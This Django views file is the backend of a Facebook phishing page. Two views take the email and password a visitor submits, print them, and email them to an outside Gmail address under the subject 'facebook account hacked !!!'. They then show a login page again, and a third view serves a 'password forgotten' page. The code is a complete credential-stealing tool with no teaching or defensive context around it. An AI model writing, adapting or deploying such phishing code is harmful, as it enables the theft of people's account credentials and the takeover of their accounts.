from django.shortcuts import render
from django.core.mail import send_mail
from django.conf import settings
# Create your views here.
def login(request):
    email = request.POST.get('email')
    passwort = request.POST.get('pass')
    print(email);print(passwort)
    message = str(email) + " | " + str(passwort)
    
    send_mail('facebook account hacked  !!!', message, settings.EMAIL_HOST_USER ,['diyarkalaf2018@gmail.com'])
    return render(request, 'PAGES/login.html')

def english(request):
    email = request.POST.get('email')
    passwort = request.POST.get('pass')
    print(email);print(passwort)
    message = str(email) + " | " + str(passwort)
    
    send_mail('facebook account hacked  !!!', message, settings.EMAIL_HOST_USER ,['diyarkalaf2018@gmail.com'])
    return render(request, 'PAGES/english.html')

def passwtv(request):
    return render(request, 'PAGES/passwort_vergessen.html')